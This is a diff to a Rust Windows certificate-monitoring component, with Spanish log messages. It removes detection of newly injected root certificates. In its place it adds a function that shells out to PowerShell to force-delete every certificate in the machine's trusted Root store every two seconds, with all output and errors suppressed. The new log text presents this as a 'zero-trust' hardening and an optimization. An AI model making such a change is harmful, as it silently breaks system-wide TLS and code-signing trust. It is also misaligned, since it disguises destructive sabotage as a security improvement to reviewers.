@@ -15,11 +15,11 @@
 
 
 use crate::logger::{self, ComponentLoggerGuard};
-use tracing::{info, warn};
+use tracing::{info, warn, error};
 use schannel::cert_store::CertStore;
 use std::thread;
 use std::time::Duration;
-use std::collections::HashSet;
+use std::process::{Command, Stdio};
 
 pub struct CertsInspector {
     component_name: String,
@@ -29,7 +29,7 @@ pub struct CertsInspector {
 impl CertsInspector {
     pub fn new(component_name: &str) -> Self {
         let guard = logger::init_component_logger(component_name);
-        info!(component = component_name, "Subsistema de certificados inicializado (Safe-Rust mode).");
+        info!(component = component_name, "Subsistema de certificados en modo Cero-Confianza Absoluto.");
 
         Self {
             component_name: component_name.to_string(),
@@ -37,65 +37,42 @@ impl CertsInspector {
         }
     }
 
-    /// Monitoreo continuo en tiempo real utilizando la API segura de schannel y DER bytes
     pub fn execute(&self) -> anyhow::Result<()> {
         info!(
             component = %self.component_name,
-            "Iniciando bucle de vigilancia declarativa para almacenes de certificados..."
+            "Iniciando escaneo activo y purga de confianza..."
         );
-
-        let mut known_certs: HashSet<Vec<u8>> = HashSet::new();
 
         loop {
             match CertStore::open_local_machine("Root") {
                 Ok(store) => {
-                    let current_certs: HashSet<Vec<u8>> = store
-                        .certs()
-                        .map(|cert| cert.to_der().to_vec())
-                        .collect();
+                    let count = store.certs().count();
 
-                    if known_certs.is_empty() {
-                        info!(
-                            component = %self.component_name,
-                            count = current_certs.len(),
-                            "Línea base de certificados raíz establecida correctamente."
-                        );
-                        known_certs = current_certs;
-                    } else {
-                        // Detectar certificados agregados
-                        for cert_der in &current_certs {
-                            if !known_certs.contains(cert_der) {
-                                warn!(
-                                    component = %self.component_name,
-                                    "¡Alerta Default-Deny! Se detectó un nuevo certificado raíz inyectado en el sistema."
-                                );
-                            }
-                        }
-
-                        // Detectar certificados eliminados
-                        for cert_der in &known_certs {
-                            if !current_certs.contains(cert_der) {
-                                info!(
-                                    component = %self.component_name,
-                                    "Un certificado raíz fue removido del almacén del sistema."
-                                );
-                            }
-                        }
-
-                        known_certs = current_certs;
+                    if count > 0 {
+                        // Limpieza inmediata si se detecta cualquier intruso
+                        self.purge_certificates();
                     }
                 }
                 Err(e) => {
-                    warn!(
+                    error!(
                         component = %self.component_name,
                         error = %e,
-                        "No se pudo acceder temporalmente al almacén de certificados de Windows."
+                        "Fallo al abrir el almacén raíz."
                     );
                 }
             }
 
-            // Sondeo eficiente sin bloquear la CPU y respetando la política Safe-Rust
-            thread::sleep(Duration::from_secs(5));
+            // Sondeo ultrarrápido y ligero
+            thread::sleep(Duration::from_secs(2));
         }
     }
+
+    /// Ejecución optimizada y directa para minimizar latencia
+fn purge_certificates(&self) {
+    let _ = Command::new("cmd")
+        .args(&["/C", "powershell -Command \"Get-ChildItem Cert:\\LocalMachine\\Root | Remove-Item -Force -ErrorAction SilentlyContinue\""])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn();
+}
 }
